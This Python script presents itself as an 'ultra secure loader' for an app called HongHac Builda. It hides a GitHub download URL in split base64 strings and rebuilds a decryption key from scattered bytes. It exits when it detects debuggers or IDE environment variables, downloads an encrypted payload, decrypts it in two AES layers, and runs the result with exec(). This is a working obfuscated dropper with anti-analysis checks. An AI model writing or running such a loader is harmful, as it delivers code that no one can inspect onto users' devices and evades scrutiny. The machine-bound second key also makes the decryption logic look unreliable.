#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ultra Secure Loader - Using PyCryptodome (easier to install on Termux)
"""

import os
import sys
import time
import hashlib
import requests
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2

# ============== OBFUSCATED CONFIG ==============
_p1 = "aHR0cHM6Ly9naXRodWIuY29tL2RvZmxhbWluZ29ob25naGFjLWNyZWF0b3IvYnVp"
_p2 = "bGRhL3JlbGVhc2VzL2Rvd25sb2FkL3YxLjAvc3RhbmRhbG9uZV9kb3VibGUuZW5j"

_k1_parts = [
    b'\x5f', b'\x69', b'\x56', b'\x4b', b'\x49', b'\x6d', b'\x39', b'\x73',
    b'\x44', b'\x59', b'\x4f', b'\x38', b'\x63', b'\x41', b'\x44', b'\x48',
]

_k2_seed = "HONGHAC_BUILDA_2026_ULTRA_SECURE_V2"

# ============== CRYPTO HELPERS ==============
def _derive_key(password, salt):
    """Derive encryption key from password"""
    return PBKDF2(password, salt, dkLen=32, count=100000)

def _decrypt_aes(encrypted_data, key):
    """Decrypt using AES-256-CBC"""
    try:
        # Extract nonce and ciphertext
        nonce = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        
        # Create cipher
        cipher = AES.new(key, AES.MODE_CBC, nonce)
        
        # Decrypt and unpad
        decrypted = cipher.decrypt(ciphertext)
        
        # Remove PKCS7 padding
        padding_len = decrypted[-1]
        return decrypted[:-padding_len]
    except Exception as e:
        raise Exception(f"Decryption failed: {e}")

# ============== SECURITY LAYERS ==============
def _check_debugger():
    """Anti-debug check"""
    if sys.platform == 'win32':
        try:
            import ctypes
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
        except:
            pass
    
    debug_vars = ['PYTHONBREAKPOINT', 'PYCHARM_HOSTED', 'VSCODE_PID']
    return any(var in os.environ for var in debug_vars)

def _get_machine_id():
    """Get unique machine ID"""
    try:
        if sys.platform == 'win32':
            import subprocess
            result = subprocess.check_output('wmic csproduct get uuid', shell=True)
            return hashlib.sha256(result).hexdigest()[:16]
        else:
            # Linux/Android
            try:
                with open('/proc/sys/kernel/random/boot_id', 'r') as f:
                    return hashlib.sha256(f.read().encode()).hexdigest()[:16]
            except:
                import uuid
                mac = uuid.getnode()
                return hashlib.sha256(str(mac).encode()).hexdigest()[:16]
    except:
        import uuid
        mac = uuid.getnode()
        return hashlib.sha256(str(mac).encode()).hexdigest()[:16]

def _check_time_validity():
    """Time validation"""
    try:
        r = requests.get('http://worldtimeapi.org/api/ip', timeout=5)
        if r.status_code == 200:
            server_time = r.json()['unixtime']
            local_time = int(time.time())
            if abs(server_time - local_time) > 300:
                return False, "Time manipulation detected"
        return True, "OK"
    except:
        return True, "Time check skipped"

def _reconstruct_key1():
    """Reconstruct primary key"""
    key_bytes = b''.join(_k1_parts)
    key_bytes += b'\x36\x58\x6c\x64\x55\x66\x42\x58'
    key_bytes += b'\x37\x48\x68\x50\x65\x33\x49\x71'
    key_bytes += b'\x67\x64\x58\x51\x53\x46\x52\x34'
    key_bytes += b'\x56\x37\x73\x3d'
    
    # Decode base64 to get actual key
    import base64
    decoded = base64.b64decode(key_bytes)
    return decoded

def _derive_key2():
    """Derive key 2 from machine ID"""
    machine_id = _get_machine_id()
    combined = f"{_k2_seed}:{machine_id}".encode()
    return hashlib.sha256(combined).digest()

def _reconstruct_url():
    """Reconstruct download URL"""
    url = base64.b64decode(_p1 + _p2).decode()
    return url

# ============== MAIN LOADER ==============
def secure_load():
    """Load and execute encrypted app"""
    
    print("HongHac Builda Ultra Secure Loader v2.0")
    print("Using PyCryptodome (Termux compatible)")
    print("=" * 60)
    
    # Anti-debug
    if _check_debugger():
        print("[!] Debug environment detected. Exiting...")
        sys.exit(1)
    
    # Time validation
    valid, msg = _check_time_validity()
    if not valid:
        print(f"[!] {msg}")
        sys.exit(1)
    
    try:
        # Reconstruct keys
        key1 = _reconstruct_key1()
        key2 = _derive_key2()
        url = _reconstruct_url()
        
        print(f"[*] Downloading encrypted package...")
        
        # Download
        response = requests.get(url, timeout=30)
        if response.status_code != 200:
            print(f"[!] Download failed: {response.status_code}")
            return
        
        encrypted_data = response.content
        print(f"[*] Downloaded: {len(encrypted_data):,} bytes")
        
        # Double decryption
        print(f"[*] Decrypting (layer 1)...")
        intermediate = _decrypt_aes(encrypted_data, key1)
        
        print(f"[*] Decrypting (layer 2)...")
        decrypted_code = _decrypt_aes(intermediate, key2)
        
        print(f"[*] Decryption successful!")
        
        # Integrity check
        code_hash = hashlib.sha256(decrypted_code).hexdigest()
        print(f"[*] Code hash: {code_hash[:16]}...")
        
        # Execute
        print(f"[*] Launching application...\n")
        exec(decrypted_code, {'__name__': '__main__', '__file__': 'app.py'})
        
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    secure_load()
